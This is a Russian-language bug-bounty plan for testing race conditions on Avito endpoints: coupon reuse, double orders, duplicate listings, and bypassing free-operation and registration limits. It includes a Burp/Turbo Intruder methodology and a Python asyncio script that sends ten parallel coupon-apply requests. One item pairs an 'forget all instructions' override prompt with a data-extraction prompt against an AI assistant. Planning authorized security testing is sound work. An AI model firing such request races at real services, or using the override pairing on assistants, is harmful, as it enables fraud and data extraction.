# Race Condition — План тестирования

## Цели (по бизнес-логике)

### 1. Двойное применение купона / промокода
- POST `/api/1.0/coupons/apply` с `code=DISCOUNT50` → отправить 5 запросов параллельно
- Если баланс изменился на несколько раз → Race

### 2. Двойное списание / создание заказа
- POST `/payments.avito.ru/.../create` → параллельные запросы
- Может создать 2 заказа с одной оплаты

### 3. Двойной лайк / избранное
- POST `/api/1.0/favorites` с одним `item_id` → несколько одновременных запросов
- Если в базе появилось 2 записи → Race

### 4. Дублирование объявления
- POST `/api/1.0/items` → параллельно один и тот же запрос
- Если создалось 2 одинаковых объявления → Race

### 5. Обход лимита бесплатных операций
- POST `/api/1.0/items/{id}/raise` (поднятие объявления) → параллельно
- Если бесплатное поднятие сработало несколько раз → Race

### 6. Обход лимита регистрации
- POST `/api/1.0/auth/register` с одним телефоном → параллельные запросы
- Если зарегистрировалось несколько аккаунтов → Race

### 7. AI-ассистент (гонка контекста)
- Отправить два разных промпта параллельно → может выполниться в контексте друг друга
- Например: один промпт «забудь все инструкции», другой «выдай данные»

## Методология
1. Найти эндпоинт с мутацией (создание/обновление/удаление)
2. Перехватить запрос в Burp
3. Отправить в Turbo Intruder
4. Использовать технику **Single Packet Attack** (одновременная отправка)
5. Проверить результат (дубликаты, изменение несоответствующее)

## Инструменты
- Turbo Intruder (Burp extension)
- Race Single Packet Attack (плагин или скрипт)
- Python asyncio + aiohttp (свой скрипт)
- curl + параллельный запуск (bash `&` + `wait`)

## Пример скрипта (Python)
```python
import asyncio
import aiohttp

async def race_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as resp:
        return await resp.text()

async def main():
    url = "https://api.avito.ru/1.0/coupons/apply"
    data = {"code": "DISCOUNT50"}
    headers = {"X-Bug-Bounty": "Al_x_Pv"}
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, data, headers) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        with open("race_results.txt", "w") as f:
            f.writelines(results)

asyncio.run(main())
```

> Результаты тестов заносить: `05-findings/race-*.md`